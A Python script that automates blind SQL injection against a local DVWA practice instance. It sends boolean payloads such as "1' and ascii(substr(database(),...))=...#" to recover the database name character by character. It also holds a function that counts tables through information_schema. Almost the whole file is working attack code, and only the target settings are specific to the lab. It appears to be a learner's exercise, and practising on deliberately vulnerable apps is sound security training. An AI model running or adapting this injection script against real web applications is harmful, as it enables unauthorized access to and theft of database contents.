import requests
from bs4 import BeautifulSoup as bs

def listToString(str_list):
    result = ""
    for s in str_list:
        result += s
    return result.strip()

#############################직접 입력해야하는 값들#############################

url ="http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/"

add_url = '?id=1&Submit=Submit&'

session = "PHPSESSID"
session_val = "sdoop6tab6tochvo3jvoakevsg"

cookies = {session: session_val,"security":"low"}

check_str ='User ID exists in the database.'

##############################################################################

def check_length():
    len = 0
    while True:
        len = len + 1
        attack_code ="1' and length(database())={} #".format(len)
        payload = {
            "id": attack_code,
            "Submit": "Submit"
                }
        res = requests.post(url, cookies=cookies, params=payload)
        soup = bs(res.text, "html.parser")
        pre_tag = soup.find('pre')
        if pre_tag is not None:
            if pre_tag.text == check_str:
                print(len)
                print('length is: ' + str(len))
                print('---------------------------------------------+')
                return len
#1' and ascii(substr(database(),1,1))=100 # (0,127)
def check_name():
    acode = 1
    len = check_length()
    name=[]
    for length in range(len):
        for acode in range(32,127):
            if acode == 37 or acode == 126 or acode == 94 or acode == 92 or acode == 60 or acode == 59 or acode == 63 or acode == 92 : 
                continue
            attack_code ="1' and ascii(substr(database(),{0},1))={1}#".format(length+1, acode)
            payload = {
                "id": attack_code,
                "Submit": "Submit"
            }
            res = requests.post(url, cookies=cookies, params=payload)
            soup = bs(res.text, "html.parser")
            pre_tag = soup.find('pre')
            if pre_tag is not None:
                if pre_tag.text == check_str:
                    print(chr(acode))
                    name.append(chr(acode))
                    print('ascii is:' + str(acode)+" Text is:" + chr(acode) )
                    print('---------------------------------------------+')
    print("database name is:" + listToString(name))

def count():
    cnum = 0
    while True:
        cnum = cnum + 1
        attack_code ="1' and (select count(table_name)from information_schema.tables where table_schema ='dvwa')={}#".format(cnum)
        payload = {
            "id": attack_code,
            "Submit": "Submit"
                }
        res = requests.post(url, cookies=cookies, params=payload)
        soup = bs(res.text, "html.parser")
        pre_tag = soup.find('pre')
        if pre_tag is not None:
            if pre_tag.text == check_str:
                print(cnum)
                print('table count is: ' + str(cnum))
                print('---------------------------------------------+')
                return cnum

check_name()